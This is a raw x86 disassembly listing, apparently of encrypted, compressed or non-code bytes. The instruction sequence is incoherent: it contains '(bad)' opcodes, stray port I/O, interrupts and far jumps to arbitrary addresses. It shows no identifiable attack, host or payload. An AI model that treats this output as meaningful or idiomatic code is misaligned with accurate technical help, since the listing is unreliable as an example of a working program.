  401fee:	pop    es
  401fef:	clc    
  401ff0:	je     0x40203a
  401ff2:	int3   
  401ff3:	fiadd  WORD PTR [esi-0x15]
  401ff6:	enter  0xd3ac,0x93
  401ffa:	pushf  
  401ffb:	jae    0x401fa9
  401ffd:	ds push ecx
  401fff:	data16 test BYTE PTR [edx+eiz*8],ah
  402003:	arpl   WORD PTR [esi+eax*4],cx
  402006:	xchg   DWORD PTR [edi],ebx
  402008:	and    eax,DWORD PTR [edi]
  40200a:	enter  0xe853,0xd7
  40200e:	sub    bl,bh
  402010:	mov    ds:0x2abb2618,eax
  402015:	or     al,0xc8
  402017:	sbb    dh,BYTE PTR ds:0x14b98600
  40201d:	into   
  40201e:	sti    
  40201f:	mov    dh,BYTE PTR [ebx-0xa]
  402022:	mov    ebx,es
  402024:	jp     0x401fb7
  402026:	inc    eax
  402027:	adc    al,0x86
  402029:	repz jne 0x402034
  40202c:	push   es
  40202d:	arpl   dx,di
  40202f:	mov    ch,0xe7
  402031:	inc    esp
  402032:	and    al,BYTE PTR ds:0xddbbde95
  402038:	stos   DWORD PTR es:[edi],eax
  402039:	fidiv  DWORD PTR [ebx]
  40203b:	add    esi,0xf5126118
  402041:	int    0x42
  402043:	out    dx,al
  402044:	shl    DWORD PTR [eax-0x42],cl
  402047:	xchg   DWORD PTR es:[ebp+0x7fb9aa0c],ecx
  40204e:	mov    edi,0x53029b3f
  402053:	adc    dh,BYTE PTR [esi-0x3b761593]
  402059:	aaa    
  40205a:	int3   
  40205b:	mov    ds:0xcc9f03fa,eax
  402060:	rcr    bh,0xc0
  402063:	mov    al,0xdd
  402065:	mov    eax,ds:0xd4c90dfa
  40206a:	xchg   esp,eax
  40206b:	in     eax,0xa5
  40206d:	loope  0x402044
  40206f:	dec    edi
  402070:	leave  
  402071:	pushf  
  402072:	neg    BYTE PTR [edx+edx*2-0x27b75396]
  402079:	pop    edx
  40207a:	sub    al,0x2d
  40207c:	sbb    DWORD PTR [ebx+0x22f20c58],0xfffffffc
  402083:	std    
  402084:	fistp  DWORD PTR [edi]
  402086:	cmp    bh,0xa7
  402089:	cmp    bl,BYTE PTR [eax+0x14]
  40208c:	test   eax,0x87c0ec93
  402091:	push   ebx
  402092:	iret   
  402093:	cs ret 
  402095:	jo     0x402035
  402097:	mov    al,0x39
  402099:	(bad)  
  40209a:	or     eax,0x6af8ea98
  40209f:	xor    eax,0xb23e8495
  4020a4:	je     0x4020b1
  4020a6:	retf   0x2d86
  4020a9:	rcl    DWORD PTR [edi],0xfb
  4020ac:	sbb    al,0xd3
  4020ae:	popf   
  4020af:	retf   
  4020b0:	ja     0x402054
  4020b2:	add    DWORD PTR [eax+0x1ccf33d8],eax
  4020b8:	adc    DWORD PTR [eax-0x2163867d],edx
  4020be:	into   
  4020bf:	jo     0x402140
  4020c1:	push   ss
  4020c2:	push   eax
  4020c3:	sti    
  4020c4:	push   ebx
  4020c5:	cmp    al,0x91
  4020c7:	sar    bl,1
  4020c9:	adc    BYTE PTR es:[edx],0x19
  4020cd:	outs   dx,DWORD PTR ds:[esi]
  4020ce:	jp     0x402134
  4020d0:	cmp    BYTE PTR [edi-0x17],0xa7
  4020d4:	pop    ds
  4020d5:	mov    edi,0x8d86894
  4020da:	popa   
  4020db:	xchg   DWORD PTR [edx+0x66],ebp
  4020de:	mov    ds:0xc04ce6d4,al
  4020e3:	add    al,0x24
  4020e5:	inc    esi
  4020e6:	ss and eax,0x3a955003
  4020ec:	sub    eax,0x6425be32
  4020f1:	inc    ebp
  4020f2:	jmp    0x40214d
  4020f4:	(bad)  
  4020f5:	inc    ecx
  4020f6:	inc    edi
  4020f7:	aaa    
  4020f8:	add    esi,DWORD PTR [edx-0x9828e88]
  4020fe:	pop    ds
  4020ff:	in     eax,dx
  402100:	mov    ebp,DWORD PTR [edi+eax*4-0x725db1a1]
  402107:	ret    0x105e
  40210a:	xor    ebp,DWORD PTR [edi+0x6dd32c32]
  402110:	or     ebx,eax
  402112:	pop    esp
  402113:	into   
  402114:	stos   DWORD PTR es:[edi],eax
  402115:	inc    edx
  402116:	ins    BYTE PTR es:[edi],dx
  402117:	adc    dh,BYTE PTR [esi+0x42]
  40211a:	push   ebx
  40211b:	gs mov al,0x98
  40211e:	inc    edx
  40211f:	dec    esp
  402120:	int3   
  402121:	popf   
  402122:	jno    0x402131
  402124:	cmp    BYTE PTR [ebp+0x18],dl
  402127:	test   eax,0xaae0f2ec
  40212c:	ins    DWORD PTR es:[edi],dx
  40212d:	std    
  40212e:	jmp    0xd4fe:0x647f4af9
  402135:	arpl   bx,bx
  402137:	mov    dl,0x96
  402139:	mov    cl,0xb5
  40213b:	(bad)  
  40213c:	int    0x5d
  40213e:	pop    eax
  40213f:	sub    al,0x66
  402141:	jae    0x4020c7
  402143:	mov    ch,0x27
  402145:	jae    0x402128
  402147:	dec    ebx
  402148:	neg    BYTE PTR [ecx+edi*8+0x37]
  40214c:	data16 outs dx,BYTE PTR ds:[esi]
  40214e:	mov    fs,WORD PTR fs:[ebx]
  402151:	mov    cl,0xe1
  402153:	push   eax
  402154:	xor    bh,BYTE PTR [ebx]
  402156:	(bad)  
  402157:	shl    BYTE PTR [eax+0x5],1
  40215a:	inc    esi
  40215b:	inc    eax
  40215c:	cmp    eax,0x967ff1ef
  402161:	or     esp,DWORD PTR [eax+0x39]
  402164:	int3   
  402165:	call   0xd0d1f058
  40216a:	adc    ch,BYTE PTR [ecx+0x40c3f616]
  402170:	call   0x578c50c5
  402175:	and    bl,BYTE PTR [ebx]
  402177:	or     BYTE PTR [ebx],ah
  402179:	add    al,0x42
  40217b:	or     al,BYTE PTR [ecx+0x69]
  40217e:	daa    
  40217f:	loop   0x40218a
  402181:	fmul   st,st(6)
  402183:	add    dh,bl
  402185:	imul   ebx,DWORD PTR [esi+0x270e8504],0x3664b473
  40218f:	vsubpd xmm3,xmm4,xmm6
  402193:	push   es
  402194:	jle    0x40212b
  402196:	into   
  402197:	inc    edx
  402198:	js     0x40219a
  40219a:	mov    ah,0xff
  40219c:	imul   esp,DWORD PTR [edi-0x5d],0x51
  4021a0:	adc    ch,BYTE PTR [edi+0x54]
  4021a3:	das    
  4021a4:	xchg   BYTE PTR [esi-0x69],dl
  4021a7:	pop    ecx
  4021a8:	mov    eax,0x76cbaaee
  4021ad:	jmp    FWORD PTR [edx-0x5dadd783]
  4021b3:	fistp  QWORD PTR [edx-0x4a3d84e8]
  4021b9:	repz push edx
  4021bb:	(bad)  [ecx+0x56]
  4021be:	stos   DWORD PTR es:[edi],eax
  4021bf:	rol    DWORD PTR [eax+esi*8-0x773791c9],0x30
  4021c7:	ret    
  4021c8:	xchg   esp,eax
  4021c9:	pop    ebp
  4021ca:	mov    esi,0x70c3cc9d
  4021cf:	int    0x29
  4021d1:	retf   0x22d
  4021d4:	sub    DWORD PTR [esi-0x7537414],esp
  4021da:	adc    al,0x27
  4021dc:	out    dx,al
  4021dd:	retfw  
  4021df:	cld    
  4021e0:	sbb    al,0xaf
  4021e2:	lea    ecx,ds:0xdba809fb
  4021e8:	(bad)  
  4021e9:	sbb    eax,DWORD PTR [eax]
  4021eb:	xchg   ebp,eax
  4021ec:	loopne 0x4021d7
  4021ee:	xchg   BYTE PTR [edx],dh
  4021f0:	arpl   WORD PTR [esi+0x2e],dx
  4021f3:	out    dx,al
  4021f4:	mov    WORD PTR [edx+edx*4+0x27],?
  4021f8:	repz xchg esi,eax
  4021fa:	fdiv   QWORD PTR [ebx+0x14de707a]
  402200:	pop    esi
  402201:	xchg   edx,eax
  402202:	xor    eax,0xc995b1d5
  402207:	cmc    
  402208:	mov    BYTE PTR [esi-0x66ab48cf],bl
  40220e:	sar    DWORD PTR [edx+0x54],cl
  402211:	stos   DWORD PTR es:[edi],eax
  402212:	or     BYTE PTR [ecx-0x8],0x64
  402216:	mov    ds:0x4f0b9c11,eax
  40221b:	jp     0x402239
  40221d:	and    ebp,DWORD PTR [esi]
  40221f:	sbb    eax,0xe29181be
  402224:	xor    al,0xac
  402226:	ret    0xfdc1
  402229:	push   cs
  40222a:	xchg   ecx,ebx
  40222c:	sub    al,bh
  40222e:	sbb    al,0x9c
  402230:	pop    esi
  402231:	mov    eax,ds:0x57d67f86
  402236:	sar    BYTE PTR ds:0xff4b950d,0x25
  40223d:	in     eax,dx
  40223e:	xor    ah,BYTE PTR [edi+0x9]
  402241:	push   ss
  402242:	xor    ebp,DWORD PTR [edi]
  402244:	aas    
  402245:	daa    
  402246:	popf   
  402247:	nop
  402248:	dec    edx
  402249:	popf   
  40224a:	xchg   edx,eax
  40224b:	cmp    DWORD PTR [ebx-0x1e],ebx
  40224e:	push   ds
  40224f:	or     ebx,DWORD PTR [ebp+eax*1+0x5]
  402253:	cwde   
  402254:	adc    bl,BYTE PTR [edx]
  402256:	in     al,dx
  402257:	push   edx
  402258:	push   0x5c
  40225a:	jno    0x402281
  40225c:	xchg   ecx,eax
  40225d:	jo     0x4022ae
  40225f:	push   0x28b011ae
  402264:	mov    dh,0xbd
  402267:	scas   al,BYTE PTR es:[edi]
  402268:	fs (bad) 
  40226a:	xchg   ecx,eax
  40226b:	sbb    DWORD PTR [edx+ebx*8+0x33191dc4],edx
  402272:	inc    eax
  402273:	jbe    0x4022ab
  402275:	imul   ebp,DWORD PTR [edx],0x4680064f
  40227b:	pusha  
  40227c:	jmp    0xbe467ce2
  402281:	and    eax,0xf6ad94f7
  402286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402287:	mov    dl,ah
  402289:	adc    al,0xc1
  40228b:	sub    al,0x49
  40228d:	lea    esp,[edx]
  40228f:	adc    eax,0x57be0ae9
  402294:	and    eax,0xb72af383
  402299:	lds    esp,FWORD PTR [ecx-0x44]
  40229c:	xor    esi,DWORD PTR [ecx+0x1f79ca4d]
  4022a2:	cmp    DWORD PTR [edi-0x64],eax
  4022a5:	jmp    0xa014:0xfb3efa34
  4022ac:	jg     0x402309
  4022ae:	iret   
  4022af:	les    esp,FWORD PTR [esp+ebx*1+0x1cea0c3e]
  4022b6:	pop    edi
  4022b7:	pusha  
  4022b8:	add    al,0x7c
  4022ba:	int3   
  4022bb:	sub    al,0x31
  4022bd:	dec    edi
  4022be:	lods   eax,DWORD PTR ds:[esi]
  4022bf:	pop    esi
  4022c0:	out    dx,eax
  4022c1:	cmp    DWORD PTR [ebx+0x7d],eax
  4022c4:	jne    0x4022d5
  4022c6:	stc    
  4022c7:	pop    ss
  4022c8:	ins    BYTE PTR es:[edi],dx
  4022c9:	or     eax,0xd5d430d2
  4022ce:	in     al,dx
  4022cf:	jns    0x4022e2
  4022d1:	jb     0x40228b
  4022d3:	push   0x0
  4022d5:	imul   DWORD PTR [esi+esi*4+0x1971b128]
  4022dc:	rcr    DWORD PTR [ebx-0x7c],cl
  4022df:	mov    ds:0x661293cb,al
  4022e4:	jle    0x40233e
  4022e6:	jmp    0x4022ff
  4022e8:	cmc    
  4022e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022ea:	or     BYTE PTR [ecx],bl
  4022ec:	repz mov bl,0x8c
  4022ef:	jmp    0x3565:0x489d41bf
  4022f6:	mov    esi,0x9dc2cd39
  4022fb:	xor    BYTE PTR [edi+0x3b2e6f25],0xa9
  402302:	fbld   TBYTE PTR [ebx+0x87476a2]
  402308:	ret    
  402309:	pop    edi
  40230a:	inc    ebp
  40230b:	jecxz  0x402343
  40230d:	fbstp  TBYTE PTR [edx+0x2]
  402310:	int    0xd0
  402312:	pop    eax
  402313:	mov    ebp,0x2c1a8025
  402318:	jo     0x402342
  40231a:	xchg   ecx,eax
  40231b:	(bad)  
  40231c:	into   
  40231d:	sbb    DWORD PTR [eax],esi
  40231f:	cwde   
  402320:	fsubrp st(0),st
  402322:	popf   
  402323:	or     BYTE PTR [edi],cl
  402325:	jae    0x40236a
  402327:	pop    es
  402328:	mov    edx,0x6b048076
  40232d:	xchg   ebx,eax
  40232e:	push   eax
  40232f:	adc    al,0xb7
  402331:	pop    ds
  402332:	lea    edi,[eax-0x7e867309]
  402338:	jne    0x402322
  40233a:	addr16 dec ebp
  40233c:	jp     0x4022e3
  40233e:	jmp    0x4022dc
  402340:	jbe    0x402369
  402342:	icebp  
  402343:	je     0x402392
  402345:	jp     0x40233e
  402347:	stc    
  402348:	cwde   
  402349:	(bad)  
  40234a:	js     0x4022d0
  40234c:	mov    dh,BYTE PTR [ecx+0x34]
  40234f:	(bad)  
  402350:	in     al,0x1c
  402352:	and    eax,0x546a5956
  402357:	cdq    
  402358:	icebp  
  402359:	push   0x4d
  40235b:	es in  eax,dx
  40235d:	cmp    ch,dl
  40235f:	pop    ds
  402360:	pop    ecx
  402361:	retf   
  402362:	nop
  402363:	jo     0x40230d
  402365:	add    BYTE PTR [eax+0x38044a9a],ah
  40236b:	xchg   edx,eax
  40236c:	jns    0x4023a6
  40236e:	cdq    
  40236f:	imul   esp,DWORD PTR [esi-0x4b6d2fb5],0xf8a9bd57
  402379:	dec    esi
  40237a:	ds mov ecx,0xcd7d5b66
  402380:	test   al,0x1
  402382:	cdq    
  402383:	loop   0x4023ae
  402385:	xchg   ecx,eax
  402386:	jle    0x402343
  402388:	outs   dx,BYTE PTR ds:[esi]
  402389:	test   eax,0x693515b9
  40238e:	retf   0x4eca
  402391:	and    esp,DWORD PTR [edx+eax*8-0x3f]
  402395:	and    DWORD PTR [ebp-0x7c4beb3e],edx
  40239b:	or     BYTE PTR [ebx],dl
  40239d:	(bad)  [esi+0x3e]
  4023a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023a1:	and    ah,dl
  4023a3:	fidivr DWORD PTR [edx+ebx*1-0x145188de]
  4023aa:	push   esi
  4023ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ac:	add    eax,0x6e564d92
  4023b1:	push   cs
  4023b2:	cmp    eax,0xe29bdc64
  4023b7:	scas   eax,DWORD PTR es:[edi]
  4023b8:	push   ecx
  4023b9:	jne    0x40240a
  4023bb:	jns    0x40238d
  4023bd:	mov    edx,DWORD PTR [esi]
  4023bf:	xchg   ecx,eax
  4023c0:	out    dx,eax
  4023c1:	dec    ebp
  4023c2:	sub    edx,DWORD PTR gs:[eax]
  4023c5:	add    bh,BYTE PTR [ebx-0x155f799f]
  4023cb:	sar    dl,1
  4023cd:	outs   dx,DWORD PTR ds:[esi]
  4023ce:	xchg   edx,eax
  4023cf:	test   DWORD PTR ds:0xcd5a335f,edi
  4023d5:	arpl   WORD PTR [eax+0x1e],bp
  4023d8:	add    al,0x16
  4023da:	jae    0x402452
  4023dc:	hlt    
  4023dd:	sub    eax,0x25f87059
  4023e2:	pushf  
  4023e3:	cmp    BYTE PTR [ebp-0xc79e939],bh
  4023e9:	and    al,0x47
  4023eb:	cmp    eax,0x3d427666
  4023f0:	imul   edi,DWORD PTR [ebx-0x14],0x6f
  4023f4:	xchg   ebp,eax
  4023f5:	add    esi,esi
  4023f7:	fcomp  DWORD PTR [eax]
  4023f9:	rcl    BYTE PTR [eax+0x51],0xe6
  4023fd:	into   
  4023fe:	pop    es
  4023ff:	fnstenv [ecx]
  402401:	pop    edx
  402402:	not    BYTE PTR [eiz*8-0x41baff46]
  402409:	jmp    0xda52:0x4debde61
  402410:	dec    ebp
  402411:	ds stc 
  402413:	fidivr WORD PTR [eax+ecx*1+0x7388afb2]
  40241a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40241b:	clc    
  40241c:	jbe    0x402436
  40241e:	mov    al,0x21
  402420:	dec    ebp
  402421:	cli    
  402422:	inc    eax
  402423:	inc    edx
  402424:	jne    0x40246a
  402426:	fmul   DWORD PTR [ebx-0x680a2386]
  40242c:	enter  0xc35,0x87
  402430:	or     BYTE PTR [ebx-0x51],bh
  402433:	jmp    0xcbe4:0xafa94323
  40243a:	enter  0xdc4f,0xb1
  40243e:	jmp    0xb3191233
  402443:	mov    ds:0xf585feba,al
  402448:	xor    BYTE PTR [ecx-0x52],dl
  40244b:	rcr    DWORD PTR [eax-0x4c468669],1
  402451:	push   cs
  402452:	sbb    ah,ch
  402454:	test   al,0x8a
  402456:	dec    esi
  402457:	call   FWORD PTR [edx+0x22]
  40245a:	jmp    0xfed1:0x1ddc5f27
  402461:	aam    0x9a
  402463:	jl     0x40244a
  402465:	mov    esi,0x90ac15f2
  40246a:	jg     0x402494
  40246c:	loope  0x4024c3
  40246e:	xor    al,0x32
  402470:	pop    es
  402471:	push   ecx
  402472:	nop
  402473:	or     BYTE PTR [ebp-0x376532da],ch
  402479:	fcomi  st,st(7)
  40247b:	fsub   st(6),st
  40247d:	ja     0x40243b
  40247f:	mov    ds:0x9b86424c,al
  402484:	int3   
  402485:	or     DWORD PTR [edi-0x75210fe7],esi
  40248b:	ficom  DWORD PTR [edx]
  40248d:	pop    esi
  40248e:	adc    al,0x66
  402490:	retf   0xfce2
  402493:	repz push 0x56378d77
  402499:	dec    BYTE PTR [eax]
  40249b:	mov    al,ds:0x137e12ee
  4024a0:	inc    esi
  4024a1:	jno    0x4024e7
  4024a3:	cmp    edx,DWORD PTR [ebx]
  4024a5:	ds out dx,al
  4024a7:	(bad)  
  4024a8:	sbb    ecx,ecx
  4024aa:	pop    edx
  4024ab:	push   ds
  4024ac:	push   ebp
  4024ad:	push   eax
  4024ae:	mov    al,ds:0xfbd5d6dc
  4024b3:	inc    esi
  4024b4:	or     eax,0x9bddcd37
  4024b9:	pusha  
  4024ba:	hlt    
  4024bb:	pop    eax
  4024bc:	popa   
  4024bd:	dec    ebx
  4024be:	inc    esi
  4024bf:	call   0x9150:0xc57273ed
  4024c6:	jmp    0x402539
  4024c8:	fidiv  DWORD PTR [esi+0x25]
  4024cb:	cdq    
  4024cc:	jo     0x40245a
  4024ce:	jbe    0x4024e9
  4024d0:	stc    
  4024d1:	shl    BYTE PTR [edx],cl
  4024d3:	push   esp
  4024d4:	(bad)  
  4024d5:	xor    ecx,DWORD PTR [esi-0x52]
  4024d8:	popa   
  4024d9:	fstp   QWORD PTR [ebx-0x48acad5]
  4024df:	pop    edi
  4024e0:	xchg   edi,eax
  4024e1:	shl    BYTE PTR [esi],cl
  4024e3:	jecxz  0x4024f6
  4024e5:	(bad)  
  4024e6:	not    BYTE PTR [esi-0x2b]
  4024e9:	add    eax,DWORD PTR [ebx+0x77]
  4024ec:	pusha  
  4024ed:	pop    ds
  4024ee:	xor    al,0x75
  4024f0:	clc    
  4024f1:	rcr    DWORD PTR [eax],0x44
  4024f4:	adc    eax,0xd7f95ee1
  4024f9:	push   ds
  4024fa:	mov    dh,BYTE PTR [ecx]
  4024fc:	call   0xafae:0x9a8fc435
  402503:	test   DWORD PTR [edx],0x8a8bbbf0
  402509:	test   esp,ecx
  40250b:	jmp    0xf85b:0xbeef368e
  402512:	out    0xc7,eax
  402514:	and    BYTE PTR [esp+ebx*1],0x1c
  402518:	or     ecx,DWORD PTR [esi+edi*1]
  40251b:	out    dx,al
  40251c:	cld    
  40251d:	fcom   DWORD PTR [edi]
  40251f:	add    ebp,DWORD PTR [esi]
  402521:	ins    BYTE PTR es:[edi],dx
  402522:	iret   
  402523:	(bad)  
  402524:	hlt    
  402525:	pop    es
  402526:	and    DWORD PTR [ecx+0x3005eaef],edx
  40252c:	ret    0x3d71
  40252f:	shr    BYTE PTR [ecx+0x6cfb9d4b],1
  402535:	popa   
  402536:	mov    esp,0x831a1b59
  40253b:	jle    0x402542
  40253d:	icebp  
  40253e:	sub    cl,bl
  402540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402541:	fsubr  DWORD PTR [ecx+0x4b68cb92]
  402547:	int3   
  402548:	(bad)  
  402549:	jecxz  0x4024dc
  40254b:	push   ecx
  40254c:	jge    0x40251a
  40254e:	jge    0x4025b3
  402550:	mov    ch,0xe3
  402552:	test   al,0x5
  402554:	das    
  402555:	mov    esp,0xb2ad680a
  40255a:	pop    ss
  40255b:	sub    DWORD PTR [esi-0x9e8ab25],edx
  402561:	dec    esi
  402562:	jl     0x402594
  402564:	stos   BYTE PTR es:[edi],al
  402565:	mov    cl,0xb2
  402567:	cmc    
  402568:	jmp    0x496a:0xee1132b
  40256f:	sahf   
  402570:	mov    dh,cl
  402572:	fcomp  DWORD PTR ds:0x151f44
  402578:	lea    esi,[ebx-0x3ad65bc6]
  40257e:	jle    0x402574
  402580:	ror    DWORD PTR [edx-0x26],1
  402583:	aam    0x65
  402585:	mov    esi,0xe1de58d9
  40258a:	sahf   
  40258b:	retf   
  40258c:	jmp    0x402546
  40258e:	push   ebp
  40258f:	jmp    0xa6e8092b
  402594:	mov    esp,0xaaf8aa7b
  402599:	pop    esi
  40259a:	xchg   BYTE PTR ds:0x95a50039,ah
  4025a0:	mov    ds:0x85c0fe53,al
  4025a5:	js     0x40260d
  4025a7:	test   al,0x67
  4025a9:	jae    0x4025bc
  4025ab:	fld    QWORD PTR [bx+di+0x13]
  4025af:	loope  0x4025ad
  4025b1:	sbb    DWORD PTR [ebx],0xe1798912
  4025b7:	retf   0xdd36
  4025ba:	push   edx
  4025bb:	fs xchg ecx,eax
  4025bd:	sbb    cl,bl
  4025bf:	or     eax,0x8c893e22
  4025c4:	out    0x1e,eax
  4025c6:	dec    ecx
  4025c7:	retf   0xf11d
  4025ca:	and    edi,DWORD PTR [ebx+0x1247d46f]
  4025d0:	mov    ch,0xd5
  4025d2:	popf   
  4025d3:	pop    esp
  4025d4:	pop    ds
  4025d5:	mov    ds,WORD PTR [eax+0x57c65bca]
  4025db:	xchg   ebp,eax
  4025dc:	add    dh,BYTE PTR [ecx+0x3]
  4025df:	mov    es,WORD PTR [edi+ebx*2+0x8]
  4025e3:	dec    ecx
  4025e4:	cli    
  4025e5:	cld    
  4025e6:	es mov edx,0x5f7717e1
  4025ec:	adc    eax,0x854a751a
  4025f1:	mov    ds:0xee26bede,al
  4025f6:	iret   
  4025f7:	addr16 adc al,0x5f
  4025fa:	dec    esi
  4025fb:	xor    al,0x96
  4025fd:	lahf   
  4025fe:	mov    esp,0x958405d3
  402603:	jecxz  0x4025f0
  402605:	hlt    
  402606:	or     BYTE PTR ds:0x55ef,cl
  40260b:	ror    BYTE PTR [edi-0x1c],1
  40260e:	xchg   ebp,eax
  40260f:	jl     0x402679
  402611:	pop    ecx
  402612:	add    ecx,DWORD PTR [eax+0x0]
  402615:	dec    ebp
  402616:	or     al,0x31
  402618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402619:	out    0xd1,eax
  40261b:	adc    BYTE PTR [edi-0x19],cl
  40261e:	stos   DWORD PTR es:[edi],eax
  40261f:	fidivr WORD PTR [eax-0x37bb1bc1]
  402625:	push   edi
  402626:	test   BYTE PTR [edi+0x73],cl
  402629:	fs (bad) 
  40262b:	jns    0x402649
  40262d:	(bad)  
  40262e:	xor    ebx,esi
  402630:	dec    edx
  402631:	jmp    0xa815:0x198c7b90
  402638:	mov    edx,0x34438b06
  40263d:	cmp    al,0xec
  40263f:	mov    dh,0xe
  402641:	cwde   
  402642:	test   BYTE PTR [ecx+0x47],al
  402645:	cwde   
  402646:	dec    ecx
  402647:	mov    cl,0xca
  402649:	xchg   esp,eax
  40264a:	mov    eax,0xb106c54
  40264f:	icebp  
  402650:	xor    DWORD PTR [ebp+0x20309e67],0xffffffaf
  402657:	fidiv  DWORD PTR [ebx-0x59]
  40265a:	or     eax,0xe3e357bb
  40265f:	adc    BYTE PTR [ecx+0x12f5167c],dl
  402665:	sbb    al,0x4b
  402667:	cmp    eax,0xb555c33b
  40266c:	cmp    eax,eax
  40266e:	mov    bl,dh
  402670:	(bad)  
  402671:	dec    ecx
  402672:	inc    edi
  402673:	test   DWORD PTR [ebx-0x9],0xb77f9c77
  40267a:	dec    esp
  40267b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40267c:	push   es
  40267d:	test   BYTE PTR [ebp+0x4efd992f],0xb3
  402684:	dec    ecx
  402685:	aaa    
  402686:	cmp    al,0x60
  402688:	clc    
  402689:	sti    
  40268a:	xchg   ebp,eax
  40268b:	xchg   esi,eax
  40268c:	sub    al,0xa0
  40268e:	pop    ds
  40268f:	xchg   esi,eax
  402690:	lahf   
  402691:	mov    bh,0x1b
  402693:	sub    BYTE PTR [esi+edi*2+0x32],bl
  402697:	dec    edx
  402698:	jecxz  0x402696
  40269a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269b:	pop    es
  40269c:	in     eax,0xad
  40269e:	cmp    al,0xe4
  4026a0:	push   0x75be3bc3
  4026a5:	fdiv   DWORD PTR [ebx]
  4026a7:	stos   DWORD PTR es:[edi],eax
  4026a8:	sub    al,0xd4
  4026aa:	fisub  WORD PTR [edx+0x50]
  4026ad:	push   ss
  4026ae:	sbb    eax,0xd9e7621a
  4026b3:	lahf   
  4026b4:	lods   al,BYTE PTR ds:[esi]
  4026b5:	jecxz  0x402706
  4026b7:	mov    edi,DWORD PTR [ecx]
  4026b9:	jp     0x4026b9
  4026bb:	inc    eax
  4026bc:	(bad)  
  4026bd:	xchg   esi,eax
  4026be:	fist   DWORD PTR [edx+ebp*2]
  4026c1:	xchg   esp,eax
  4026c2:	leave  
  4026c3:	pop    ds
  4026c4:	add    esp,ecx
  4026c6:	cmp    edx,DWORD PTR [edx]
  4026c8:	inc    ebp
  4026c9:	mov    ds:0x3fbc2309,eax
  4026ce:	jle    0x4026c7
  4026d0:	mov    cl,0xc6
  4026d2:	rcl    ebp,1
  4026d4:	clc    
  4026d5:	inc    esp
  4026d6:	sbb    edx,DWORD PTR [edx+0x69bc95de]
  4026dc:	pop    ecx
  4026dd:	xchg   ebx,eax
  4026de:	xchg   esp,eax
  4026df:	int    0xb6
  4026e1:	mov    esp,DWORD PTR [eax-0x3]
  4026e4:	in     eax,dx
  4026e5:	or     BYTE PTR ds:0xcd2229b0,dh
  4026eb:	xlat   BYTE PTR ds:[ebx]
  4026ec:	sub    ebp,esp
  4026ee:	inc    esp
  4026ef:	sti    
  4026f0:	dec    esi
  4026f1:	and    al,ah
  4026f3:	mov    eax,0xc2b2613e
  4026f8:	mov    BYTE PTR [edx],cl
  4026fa:	ins    BYTE PTR es:[edi],dx
  4026fb:	xchg   BYTE PTR [ecx-0x11f1c746],al
  402701:	pushf  
  402702:	mov    esp,0x61d0271d
  402707:	nop
  402708:	das    
  402709:	add    dl,cl
  40270b:	in     al,dx
  40270c:	xchg   ebp,eax
  40270d:	mov    edi,0x3c84e45c
  402712:	and    DWORD PTR [ebp+eiz*8+0x135d6357],esi
  402719:	inc    eax
  40271a:	rcl    dl,1
  40271c:	lds    edi,FWORD PTR [ebx+0x6a]
  40271f:	mov    eax,0xb3f1f5b5
  402724:	lock out dx,eax
  402726:	push   es
  402727:	(bad)  cs:[edx+0x2ac309fa]
  40272e:	repnz mov ecx,0xa84dfb79
  402734:	(bad)  
  402735:	jg     0x5345a9e7
  40273b:	and    DWORD PTR [eax],edx
  40273d:	xor    dl,BYTE PTR [edx]
  40273f:	rcl    BYTE PTR [bp+di+0x2d2e],cl
  402744:	icebp  
  402745:	loopne 0x40277f
  402747:	xchg   ebp,eax
  402748:	push   esi
  402749:	push   0xd5ea3b9c
  40274e:	and    eax,0xcc7ca311
  402753:	adc    dh,BYTE PTR [ebx+0x5b]
  402756:	inc    edi
  402757:	sub    al,0x8b
  402759:	test   esi,edx
  40275b:	sbb    DWORD PTR [ebx+0x13c0f40],ebx
  402761:	mov    ecx,0x6e661e77
  402766:	outs   dx,DWORD PTR ds:[esi]
  402767:	enter  0x166e,0x8f
  40276b:	jb     0x402744
  40276d:	cmp    BYTE PTR [esi+0x478d328],bh
  402773:	push   edi
  402774:	push   ss
  402775:	mov    edx,0xa03d8d09
  40277a:	mov    eax,0x8abf2623
  40277f:	jge    0x4027cd
  402781:	mov    edi,0xeb0c6331
  402786:	push   ebx
  402787:	inc    DWORD PTR [ecx-0x1b6f6830]
  40278d:	xchg   esp,eax
  40278e:	popf   
  40278f:	pop    ecx
  402790:	push   ebp
  402791:	es ss fmul st,st(1)
  402795:	shr    BYTE PTR [esi+ebx*2+0x3a],0xe6
  40279a:	mov    eax,0xcc5d7d74
  40279f:	mov    edx,0x1b0c76bb
  4027a4:	mov    ecx,0xb6a1a34a
  4027a9:	jbe    0x40279c
  4027ab:	fpatan 
  4027ad:	popa   
  4027ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027af:	mov    ds:0x4d89cceb,eax
  4027b4:	outs   dx,DWORD PTR ds:[esi]
  4027b5:	outs   dx,DWORD PTR ds:[esi]
  4027b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027b7:	adc    eax,0xf7bcd98
  4027bc:	sbb    BYTE PTR [ebp+0x5adc85f8],bh
  4027c2:	or     al,0x4f
  4027c4:	jbe    0x40279b
  4027c6:	push   esi
  4027c7:	jns    0x4027a9
  4027c9:	or     bl,ch
  4027cb:	rcr    ecx,1
  4027cd:	aad    0x89
  4027cf:	out    0x84,eax
  4027d1:	dec    esp
  4027d2:	pop    edi
  4027d3:	fadd   DWORD PTR [edi]
  4027d5:	dec    ecx
  4027d6:	push   ds
  4027d7:	ins    BYTE PTR es:[edi],dx
  4027d8:	or     dl,0x1
  4027db:	je     0x4027a7
  4027dd:	push   eax
  4027de:	cmp    al,0x5f
  4027e0:	rol    BYTE PTR [edx],cl
  4027e2:	ret    
  4027e3:	jge    0x40276a
  4027e5:	in     al,dx
  4027e6:	or     al,0xdb
  4027e8:	pop    ecx
  4027e9:	xor    al,ah
  4027eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027ec:	or     DWORD PTR [ebx],edx
  4027ee:	xor    BYTE PTR [ebp-0x76],0x33
  4027f2:	nop
